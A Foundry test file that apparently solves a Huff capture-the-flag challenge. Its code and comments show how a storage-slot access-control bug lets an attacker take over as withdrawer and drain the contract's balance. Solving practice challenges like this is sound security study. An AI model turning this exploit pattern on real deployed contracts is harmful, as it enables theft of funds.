// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Challenge03Test is Test {
  Challenge03 target;

  function setUp() public {
    target = Challenge03(HuffDeployer.deploy("challenges/Challenge03"));
    // target.withdraw();

    // send funds
    target.deposit{value: 0.1 ether}();
    assertEq(address(target).balance, 0.1 ether);
  }

  function testChallenge() public {
    // the bug is within set_withdrawer, which loads the slot not OWNER_SLOT
    // but CALLVALUE instead, so we can check any slot with it
    // so, we will first make ourself the last_depositor
    // and then call set_withdraw with CALLVALUE equal to LAST_DEPOSITOR_SLOT

    // deposit 1 wei
    target.deposit{value: 1}();

    // override owner
    target.setWithdrawer{value: 2}(address(this));
    // address owner = stdStorage.read(2);
    // assertEq(owner, address(this));

    // withdraw
    target.withdraw();

    // balance should be depleted
    assertEq(address(target).balance, 0);
  }

  receive() external payable {}

  fallback() external payable {}
}

interface Challenge03 {
  function deposit() external payable;

  function withdraw() external;

  function setWithdrawer(address) external payable;
}
